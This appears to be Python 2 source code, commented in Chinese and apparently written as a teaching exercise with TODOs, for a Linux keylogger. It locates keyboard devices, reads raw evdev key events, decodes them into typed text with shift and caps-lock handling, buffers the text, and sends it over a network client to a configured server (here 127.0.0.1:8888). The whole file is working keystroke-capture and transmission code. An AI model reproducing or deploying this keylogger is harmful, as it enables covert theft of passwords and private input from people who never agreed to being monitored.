# coding: utf-8

import os
import sys
import time
from evdev import InputDevice
from select import select
from evdev import ecodes
from evdev.events import KeyEvent
from functools import partial

sys.path.append("../")
from utils import word_ctoa, special_character_handler
from task import NetworkTaskManager, NetworkClient
from keylogger import virtual_thread_func

# linux下的系统输入设备信息目录
DEVICES_PATH = '/sys/class/input/'


class CusKeyEvent(KeyEvent):
    all_capital_chars = [chr(i) for i in range(65, 91)]
    all_numbers = [str(i) for i in range(0, 10)]

    def format_output(self, input_num):
        # 将evdev的编码转化为实际输出的字符
        return word_ctoa(input_num)

    def __init__(self, event):
        super(CusKeyEvent, self).__init__(event)

    @property
    def status_code(self):
        """ 表示按键的3种状态， up 表示按键释放， down表示按下
             hold 表示按住不放
        """
        return ("up", "down", "hold")[self.keystate]

    @property
    def key(self):
        """
             evdev拿到的原始数据是数字，需要转换成相应ascii的字符以及数字
        """
        return self.format_output(self.scancode)

    @property
    def type(self):
        """ 键盘上的按键类型非常多，有26个英文字母及数字，
             还有tab 键，left, right, enter键等等
             在这里我们简单的对数据进行一个分类，
             分为： 1. 字符类型 和 2. 数字类型，
             3. 要记录的特殊的类型： enter，backspace, enter, ', ",
             4. 不需要记录的类型

        """
        if self.key.upper() in self.all_capital_chars:
            return "char"
        if self.key.upper() in self.all_numbers:
            return "number"
        if self.key in ("enter", "backspace", ",", "'", "."):
            return "validate"
        return 'unvalidate'

    @property
    def is_show(self):
        # delete操作要删除已经输入的字符
        if self.key == 'backspace' and self.status_code != 'up':
            return True
        # 释放按键的做操后不需要
        if self.status_code == 'up':
            return False
        # 不需要显示的字符
        if self.status_code == 'hold' and (self.type == 'unvalidate'):
            return False
        return True


def device_filter(dev_content):
    """ dev_content显示了设备的名称和信息
        这里通过关键字查找的方式来判断该设备是否是键盘设备
    """
    # 如果设备信息出现中出现了keyboard这个关键词，那么就认为是键盘设备
    print "device info: ", dev_content
    if "keyboard" in dev_content.lower():
        return True
    return False


def find_keyboard_devices(device_filter_func):
    """
        找出所有的键盘设备名
    """
    # 切换到/sys/class/input/这个目录下，类似cd命令
    os.chdir(DEVICES_PATH)
    result = []
    # 遍历/sys/class/input/下的所有的目录
    for each_input_dev in os.listdir(os.getcwd()):
        # 找到设备信息相关的文件
        dev_path = DEVICES_PATH + each_input_dev + '/device/name'
        # 如果这个设备是键盘设备
        if(os.path.isfile(dev_path) and device_filter_func(file(dev_path).read())):
            result.append('/dev/input/' + each_input_dev)
    if not result:
        print("没有键盘设备")
        # 直接结束该进程
        sys.exit(-1)
    return result


def monitor_keyboard(devs):

    # 将名映射到inputDevice对象
    devices = map(InputDevice, devs)
    # dev.fd一个文件描述符， 然后建立一个字典
    devices = {dev.fd: dev for dev in devices}
    return devices


class StatusManager(object):

    def reverse_status(self, obj):
        """ 如果是true， 那么返回False, 如果是False, 那么返回True"""
        if obj:
            return False
        return True

    def __init__(self, *args, **kwargs):
        """is_shift_press表示有没有同时按住shift,
           同时按住shift和其他按键会导致最后的结果不一样，
           shift + 'c' => 'C'
           shift + '.' = > ">"

           caps 键原因一样, 按一次会变成大写，再按一次会变成小写

           # bug:
               如果在运行本程序之前，caps已经被打开，那么就会导致
               程序记录的字符全是反的，目前没有解决办法
        """
        self.is_shift_press = False
        self.is_caps_lock = False

    def recv_caps_message(self):
        """ 当按了一次caps键后， 会产生这个消息
        """
        self.is_caps_lock = self.reverse_status(self.is_caps_lock)

    def recv_shift_message(self):
        """ shift键被按时，产生这个消息
        """
        self.is_shift_press = self.reverse_status(self.is_shift_press)

    def get_current_key(self, in_str):
        status = False
        # 当caps和shift键没有同时都使用， 那么就需要小写变大写
        if self.is_shift_press != self.is_caps_lock:
            status = True
        if status:
            return in_str.upper()
        # 对特殊字符的处理
        if self.is_shift_press:
            return special_character_handler(in_str, True)
        return in_str

    def __str__(self):
        return "capital status " + str(self.is_shift_press != self.is_caps_lock) + "\n"


def decode_character():
    """
    程序一开始需要维护shift, caps的按键状态,使用闭包避免引用全局变量
    """
    status_manager = StatusManager()

    def wrapper(in_event):
        # 按了shift键,需要注意的是shift 和需要配合其他键一起按，所以需要处理up 和down状态
        if in_event.key == 'shift' and in_event.status_code != 'hold':
            status_manager.recv_shift_message()
        # 按住caps, caps没有hold状态
        elif in_event.key == "capslock" and in_event.status_code != 'up':
            assert in_event.status_code != 'hold'
            status_manager.recv_caps_message()
        elif in_event.type == 'number':
            # 如果是数字直接返回, 避免过多的判断，字母需要根据shift和caps状态进行转化
            return in_event.key
        # 如果判断该按键不需要显示，那么直接返回None， 比如f5按键等
        if not in_event.is_show:
            return None
        result = status_manager.get_current_key(in_event.key)
        return result
    return wrapper


def content_handler(net_work_handler, hook_func, str_cached_length=10):
    """
        input_str_content 保存键盘输入的内容,
        str_cached_length 缓冲区的长度为10K
        net_work_handler函数为处理记录文件的函数

       # TODO 当前的程序每次都需要去计算内容的长度，
       当输入的内容比较长时，是会严重影响性能的
       我已经帮你定义了content_length， 请完善char_handler函数
       使用content_length来代替len(input_str_content)
    """
    input_str_content = []
    postion = [None, ]
    content_length = [0, ]

    # hook_func 是为了保证缓冲区数据全部被发送出去
    def __hook_func():
        if input_str_content:
            net_work_handler("".join(input_str_content))
    hook_func[0] = __hook_func

    def char_handler(in_str):
        # backspace键，从缓冲区减去字符
        if in_str == 'backspace':
            if input_str_content:
                input_str_content.pop()
            # TODO content_length - 1
        elif in_str == 'Left':
            # 第一次执行left操作时，从缓存区最右边开始计算
            if postion[0] is None:
                postion[0] = len(input_str_content) - 2
            else:
                postion[0] = postion[0] - 1
            if postion[0] < 0:
                print u"已经到达当前缓冲区开头"
                postion[0] = 0
        elif in_str == 'Right':
            # 第一次执行right操作时，从缓存区最右边开始计算
            if postion[0] is None:
                postion[0] = len(input_str_content) - 1
            else:
                postion[0] = postion[0] + 1

            if postion[0] >= len(input_str_content):
                print u"已经到达当前缓冲区末尾"
                postion[0] = len(input_str_content) - 1
        else:
            if postion[0] is None:
                postion[0] = 0
            input_str_content.insert(postion[0] + 1, in_str)
            postion[0] = postion[0] + 1
        # 缓存区已经满了，此时需要将缓冲区的内容处理
        # net_word_handler是进行内容处理的函数，你可以保存到本地文件，
        # 也可以进行网络传输
        if len(input_str_content) >= str_cached_length:
            ret = net_work_handler("".join(input_str_content))
            if not ret:
                print u"网络错误，无法发送键盘记录文件,缓冲区已满, 程序结束"
                sys.exit(-2)
            input_str_content[:] = []

        # TODO content_length + 1
    return char_handler


def linux_thread_func(file_name, file_type, content_handler, seconds=10):
    devices = monitor_keyboard(find_keyboard_devices(device_filter))
    # 维护shift和caps状态， 对evdev库的event对象进行解析
    dec = decode_character()
    # 创建一个网络传输的socket实例
    server_instance = NetworkClient({"IP": "127.0.0.1", "PORT": 8888})
    # 传输一个文本传输的任务
    text_task = NetworkTaskManager(server_instance, file_type, file_name)
    hook_handler = [None, ]
    # 缓冲区处理, 关联网络文本传输任务
    char_handler = content_handler(text_task.send_content, hook_handler, seconds)

    now_t = time.time()
    while True:
        if int(time.time() - now_t) >= seconds:
            break
        # select 是监听文件描述符的一个库
        readers, writes, _ = select(devices.keys(), [], [])
        # readers可能有多个键盘设备，所以是一个数组结构
        for r in readers:
            events = devices[r].read()
            for event in events:
                if event.type == ecodes.EV_KEY:
                    # 转化为自定义的event对象，多了type, status_code属性
                    cus_event = CusKeyEvent(event)
                    # 对event进行解析
                    ret_char = dec(cus_event)
                    if ret_char:
                        # 将当前字符加入到缓存区，并执行相关的缓冲区操作
                        char_handler(ret_char)
    # 处理缓冲区剩余的数据
    if hook_handler[0]:
        hook_handler[0]()
    # 发送任务结束的消息
    text_task.send_stop_message()


linux_thread_func = partial(linux_thread_func, content_handler=content_handler)
if __name__ == '__main__':
    linux_thread_func("test", "txt", seconds=3)
    # virtual_thread_func("test", "txt")
